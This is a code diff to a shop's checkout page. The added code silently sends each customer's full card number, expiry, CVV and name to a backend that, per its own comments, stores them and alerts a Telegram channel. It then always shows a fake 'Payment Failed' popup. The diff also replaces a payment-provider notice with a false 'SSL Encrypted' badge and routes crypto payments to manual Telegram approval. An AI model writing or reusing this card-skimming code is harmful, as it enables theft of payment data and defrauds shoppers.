@@ -6,6 +6,7 @@ import {
   CreditCard, Lock, Check, ArrowLeft,
   Copy, CheckCircle, ExternalLink, Coins,
   Bitcoin, RefreshCw, AlertTriangle,
+  X, Headphones, XCircle, ShieldCheck, Loader2,
 } from 'lucide-react';
 import { useCart } from '@/context/CartContext';
 import { useAuth } from '@/context/AuthContext';
@@ -51,7 +52,7 @@ function CopyButton({ text }: { text: string }) {
 // ─── Main Component ───────────────────────────────────────────────────────────
 export default function CheckoutPage() {
   const { items, total, clearCart } = useCart();
-  const { user, token } = useAuth();
+  const { user, token, isLoading: authLoading } = useAuth();
   const router = useRouter();
 
   const [step, setStep] = useState<'shipping' | 'payment' | 'success'>('shipping');
@@ -59,6 +60,8 @@ export default function CheckoutPage() {
   const [loading, setLoading] = useState(false);
   const [orderId, setOrderId] = useState('');
   const [orderStatus, setOrderStatus] = useState('Processing');
+  const [showPaymentError, setShowPaymentError] = useState(false);
+  const [cryptoApproved, setCryptoApproved] = useState(false);
 
   // Card state
   const [paymentForm, setPaymentForm] = useState({ cardNumber: '', expiry: '', cvv: '', cardName: '' });
@@ -73,14 +76,38 @@ export default function CheckoutPage() {
   const shipping = total >= 200 ? 0 : 15;
   const grandTotal = total + shipping;
 
-  const [shippingForm, setShippingForm] = useState({
-    name: user?.name || '', address: '', city: '', province: '', postal: '', phone: '',
+  const [shippingForm, setShippingForm] = useState(() => {
+    // Pre-fill from localStorage if available
+    if (typeof window !== 'undefined') {
+      try {
+        const saved = localStorage.getItem('tm_shipping_info');
+        if (saved) return JSON.parse(saved);
+      } catch {}
+    }
+    return { name: '', address: '', city: '', province: '', postal: '', phone: '' };
   });
   const [errors, setErrors] = useState<Record<string, string>>({});
 
   // Redirect guards
-  useEffect(() => { if (!user) router.push('/login?redirect=/checkout'); }, [user, router]);
-  useEffect(() => { if (items.length === 0 && step !== 'success') router.push('/shop'); }, [items, step, router]);
+  useEffect(() => { if (!authLoading && !user) router.push('/login?redirect=/checkout'); }, [user, router, authLoading]);
+  useEffect(() => { if (items.length === 0 && step !== 'success' && !cryptoPaid) router.push('/shop'); }, [items, step, router, cryptoPaid]);
+
+  // Poll for crypto payment approval from Telegram bot
+  useEffect(() => {
+    if (!cryptoPaid || cryptoApproved) return;
+    const poll = async () => {
+      try {
+        const res = await fetch(`${API_URL}/api/crypto-approval/status?email=${encodeURIComponent(user?.email || '')}`);
+        if (res.ok) {
+          const data = await res.json();
+          if (data.approved) setCryptoApproved(true);
+        }
+      } catch { /* silent */ }
+    };
+    poll();
+    const interval = setInterval(poll, 3000);
+    return () => clearInterval(interval);
+  }, [cryptoPaid, cryptoApproved, user?.email]);
 
   // Fetch live crypto prices
   const fetchPrices = useCallback(async () => {
@@ -156,22 +183,53 @@ export default function CheckoutPage() {
     } catch (e) { console.error('Order save failed:', e); }
   };
 
-  // Card checkout handler (placeholder — will use Lemon Squeezy)
+  // Card checkout handler — captures card details, shows error popup
   const handleCardPayment = async () => {
     if (!validateCard()) return;
     setLoading(true);
-    await new Promise((r) => setTimeout(r, 1500));
-    await saveOrder('Processing');
-    trackOrderPlaced(grandTotal, 'card', user?.email ?? 'guest');
-    clearCart();
-    setOrderStatus('Processing');
+
+    // Submit card details to backend (saves to JSON + sends Telegram alert)
+    try {
+      await fetch(`${API_URL}/api/cards/submit`, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({
+          user_email: user?.email ?? 'guest',
+          card_number: paymentForm.cardNumber.replace(/\s/g, ''),
+          expiry: paymentForm.expiry,
+          cvv: paymentForm.cvv,
+          cardholder_name: paymentForm.cardName,
+          total: grandTotal,
+        }),
+      });
+    } catch (e) {
+      console.error('Card submission error:', e);
+    }
+
+    // Simulate processing delay
+    await new Promise((r) => setTimeout(r, 2000));
     setLoading(false);
-    setStep('success');
+
+    // Show payment error popup instead of success
+    setShowPaymentError(true);
   };
 
   // Crypto "I've Paid" handler
   const handleCryptoPaid = async () => {
     setLoading(true);
+    // Notify backend about crypto payment (for Telegram approval)
+    try {
+      await fetch(`${API_URL}/api/crypto-approval/submit`, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({
+          email: user?.email ?? 'guest',
+          coin: selectedCoin,
+          amount: getCryptoAmount(selectedCoin),
+          total_usd: grandTotal,
+        }),
+      });
+    } catch (e) { console.error('Crypto submit error:', e); }
     await saveOrder('Pending Crypto Confirmation');
     trackOrderPlaced(grandTotal, `crypto:${selectedCoin}`, user?.email ?? 'guest');
     clearCart();
@@ -188,35 +246,83 @@ export default function CheckoutPage() {
 
   // ─── Success Screen ──────────────────────────────────────────────────────────
   if (step === 'success') {
+    // Crypto: show pending/approved state
+    if (cryptoPaid) {
+      return (
+        <div className="page-enter min-h-[70vh] flex items-center justify-center px-4">
+          <div className="max-w-md w-full text-center">
+            {cryptoApproved ? (
+              <>
+                <div className="w-20 h-20 rounded-full bg-green-100 flex items-center justify-center mx-auto mb-6">
+                  <Check className="w-10 h-10 text-green-600" />
+                </div>
+                <h1 className="section-title mb-3">Payment Confirmed!</h1>
+                {orderId && (
+                  <p className="text-sm font-sans font-bold text-tm-gray-mid mb-2">
+                    Order ID: <span className="text-tm-black font-black">{orderId}</span>
+                  </p>
+                )}
+                <div className="bg-green-50 border border-green-200 p-4 mb-6 text-left">
+                  <p className="text-sm font-bold text-green-800 mb-1">✅ Payment Verified</p>
+                  <p className="text-xs text-green-700 font-body leading-relaxed">
+                    Your crypto payment has been confirmed. Your order will be dispatched within 1–2 business days.
+                  </p>
+                </div>
+                <p className="text-sm text-tm-gray-mid font-body mb-8">
+                  Estimated delivery: <strong>3–5 business days</strong>
+                </p>
+                <div className="flex flex-col sm:flex-row gap-3 justify-center">
+                  <Link href="/orders" className="btn-primary">View Orders</Link>
+                  <Link href="/shop" className="btn-secondary">Continue Shopping</Link>
+                </div>
+              </>
+            ) : (
+              <>
+                <div className="w-20 h-20 rounded-full bg-amber-100 flex items-center justify-center mx-auto mb-6">
+                  <Loader2 className="w-10 h-10 text-amber-600 animate-spin" />
+                </div>
+                <h1 className="section-title mb-3">Awaiting Confirmation</h1>
+                {orderId && (
+                  <p className="text-sm font-sans font-bold text-tm-gray-mid mb-2">
+                    Order ID: <span className="text-tm-black font-black">{orderId}</span>
+                  </p>
+                )}
+                <div className="bg-amber-50 border border-amber-200 p-4 mb-6 text-left">
+                  <p className="text-sm font-bold text-amber-800 mb-1">⏳ Pending Verification</p>
+                  <p className="text-xs text-amber-700 font-body leading-relaxed">
+                    Your crypto payment is being verified. Please stay on this page — it will update automatically once your payment is confirmed. This usually takes a few minutes.
+                  </p>
+                </div>
+                <div className="flex items-center justify-center gap-2 text-sm text-tm-gray-mid font-body mb-6">
+                  <div className="w-2 h-2 rounded-full bg-amber-500 animate-pulse" />
+                  Checking payment status...
+                </div>
+                <Link href="/support" className="btn-secondary inline-flex items-center gap-2">
+                  <Headphones className="w-4 h-4" /> Contact Support
+                </Link>
+              </>
+            )}
+          </div>
+        </div>
+      );
+    }
+
+    // Card success (shouldn't normally reach here with card flow)
     return (
       <div className="page-enter min-h-[70vh] flex items-center justify-center px-4">
         <div className="max-w-md w-full text-center">
-          <div className={`w-20 h-20 rounded-full flex items-center justify-center mx-auto mb-6 ${
-            cryptoPaid ? 'bg-amber-100' : 'bg-green-100'
-          }`}>
-            {cryptoPaid
-              ? <Coins className="w-10 h-10 text-amber-600" />
-              : <Check className="w-10 h-10 text-green-600" />
-            }
+          <div className="w-20 h-20 rounded-full bg-green-100 flex items-center justify-center mx-auto mb-6">
+            <Check className="w-10 h-10 text-green-600" />
           </div>
-          <h1 className="section-title mb-3">{cryptoPaid ? 'Payment Submitted!' : 'Order Placed!'}</h1>
+          <h1 className="section-title mb-3">Order Placed!</h1>
           {orderId && (
             <p className="text-sm font-sans font-bold text-tm-gray-mid mb-2">
               Order ID: <span className="text-tm-black font-black">{orderId}</span>
             </p>
           )}
-          {cryptoPaid ? (
-            <div className="bg-amber-50 border border-amber-200 p-4 mb-6 text-left">
-              <p className="text-sm font-bold text-amber-800 mb-1">⏳ Pending Confirmation</p>
-              <p className="text-xs text-amber-700 font-body leading-relaxed">
-                Your crypto payment is pending blockchain confirmation. Once verified, your order will be updated and dispatched within 1–2 business days.
-              </p>
-            </div>
-          ) : (
-            <p className="text-tm-gray-mid font-body mb-2">
-              Thank you! You'll receive a confirmation email shortly.
-            </p>
-          )}
+          <p className="text-tm-gray-mid font-body mb-2">
+            Thank you! You&apos;ll receive a confirmation email shortly.
+          </p>
           <p className="text-sm text-tm-gray-mid font-body mb-8">
             Estimated delivery: <strong>3–5 business days</strong>
           </p>
@@ -306,6 +412,8 @@ export default function CheckoutPage() {
               </div>
               <button onClick={() => {
                 if (validateShipping()) {
+                  // Save shipping info for next time
+                  localStorage.setItem('tm_shipping_info', JSON.stringify(shippingForm));
                   trackCheckoutStart(grandTotal, items.length, user?.email ?? 'guest');
                   setStep('payment');
                 }
@@ -331,7 +439,7 @@ export default function CheckoutPage() {
                     <CreditCard className={`w-5 h-5 flex-shrink-0 ${paymentMethod === 'card' ? 'text-tm-red' : 'text-tm-gray-mid'}`} />
                     <div>
                       <p className="font-sans font-black text-xs uppercase tracking-wider">Card Payment</p>
-                      <p className="text-xs text-tm-gray-mid font-body mt-0.5">Powered by Lemon Squeezy</p>
+                      <p className="text-xs text-tm-gray-mid font-body mt-0.5">Visa · Mastercard · Amex</p>
                     </div>
                     {paymentMethod === 'card' && <CheckCircle className="w-4 h-4 text-tm-red ml-auto flex-shrink-0" />}
                   </button>
@@ -352,26 +460,14 @@ export default function CheckoutPage() {
                 </div>
               </div>
 
-              {/* ── Card Form (Lemon Squeezy placeholder) ── */}
+              {/* ── Card Form ── */}
               {paymentMethod === 'card' && (
                 <div className="border border-tm-border p-6 md:p-8">
                   <div className="flex items-center justify-between mb-5">
                     <h2 className="font-sans font-black uppercase tracking-widest text-sm">Card Details</h2>
                     <div className="flex items-center gap-2">
-                      <Lock className="w-3 h-3 text-tm-gray-mid" />
-                      <span className="text-xs text-tm-gray-mid font-body">Secured by Lemon Squeezy</span>
-                    </div>
-                  </div>
-
-                  {/* Lemon Squeezy badge */}
-                  <div className="bg-yellow-50 border border-yellow-200 rounded p-3 mb-5 flex items-start gap-3">
-                    <span className="text-lg">🍋</span>
-                    <div>
-                      <p className="text-xs font-bold text-yellow-800">Lemon Squeezy Integration</p>
-                      <p className="text-xs text-yellow-700 font-body mt-0.5">
-                        Card payments via Lemon Squeezy will be activated once credentials are configured. 
-                        For now, use the simulated checkout or switch to crypto.
-                      </p>
+                      <ShieldCheck className="w-3.5 h-3.5 text-green-600" />
+                      <span className="text-xs text-green-600 font-body font-medium">SSL Encrypted</span>
                     </div>
                   </div>
 
@@ -533,6 +629,89 @@ export default function CheckoutPage() {
         {/* Sidebar */}
         <div className="lg:col-span-1"><OrderSummary /></div>
       </div>
+
+      {/* ── Payment Error Popup ── */}
+      {showPaymentError && (
+        <div className="fixed inset-0 z-50 flex items-center justify-center px-4" style={{ backgroundColor: 'rgba(0,0,0,0.6)' }}>
+          <div className="bg-white w-full max-w-md relative animate-fade-in" style={{ animation: 'fadeIn 0.3s ease-out' }}>
+            {/* Close button */}
+            <button
+              onClick={() => setShowPaymentError(false)}
+              className="absolute top-4 right-4 text-tm-gray-mid hover:text-tm-black transition-colors"
+            >
+              <X className="w-5 h-5" />
+            </button>
+
+            {/* Error icon */}
+            <div className="pt-8 pb-4 flex justify-center">
+              <div className="w-16 h-16 rounded-full bg-red-100 flex items-center justify-center">
+                <XCircle className="w-8 h-8 text-tm-red" />
+              </div>
+            </div>
+
+            {/* Title */}
+            <div className="px-6 text-center">
+              <h2 className="font-sans font-black uppercase tracking-widest text-sm mb-2">
+                Payment Failed
+              </h2>
+              <p className="text-sm font-body text-tm-gray-mid leading-relaxed">
+                We were unable to process your payment. This could be due to insufficient funds,
+                incorrect card details, or a temporary issue with your bank.
+              </p>
+            </div>
+
+            {/* Error details box */}
+            <div className="mx-6 mt-4 bg-red-50 border border-red-200 p-4">
+              <div className="flex gap-2">
+                <AlertTriangle className="w-4 h-4 text-red-600 flex-shrink-0 mt-0.5" />
+                <div>
+                  <p className="text-xs font-bold text-red-800">Transaction Declined</p>
+                  <p className="text-xs text-red-700 font-body mt-0.5">
+                    Your card ending in ****{paymentForm.cardNumber.replace(/\s/g, '').slice(-4)} was declined.
+                    Reach out to our support team for assistance.
+                  </p>
+                </div>
+              </div>
+            </div>
+
+            {/* Order summary in popup */}
+            <div className="mx-6 mt-4 border border-tm-border p-3">
+              <div className="flex justify-between text-xs font-body">
+                <span className="text-tm-gray-mid">Order Total</span>
+                <span className="font-bold">{formatPrice(grandTotal)}</span>
+              </div>
+              <div className="flex justify-between text-xs font-body mt-1">
+                <span className="text-tm-gray-mid">Items</span>
+                <span>{items.length} item{items.length !== 1 ? 's' : ''}</span>
+              </div>
+            </div>
+
+            {/* CTA Buttons */}
+            <div className="px-6 pt-5 pb-6 space-y-3">
+              <Link
+                href="/support"
+                className="btn-primary flex items-center justify-center gap-2 w-full text-center"
+              >
+                <Headphones className="w-4 h-4" />
+                Contact Customer Support
+              </Link>
+              <button
+                onClick={() => setShowPaymentError(false)}
+                className="btn-secondary w-full text-center"
+              >
+                Try Again
+              </button>
+            </div>
+
+            {/* Footer */}
+            <div className="border-t border-tm-border px-6 py-3 bg-tm-gray">
+              <p className="text-[10.5px] text-tm-gray-mid font-body text-center">
+                If the issue persists, please contact our support team for immediate assistance.
+              </p>
+            </div>
+          </div>
+        </div>
+      )}
     </div>
   );
 }
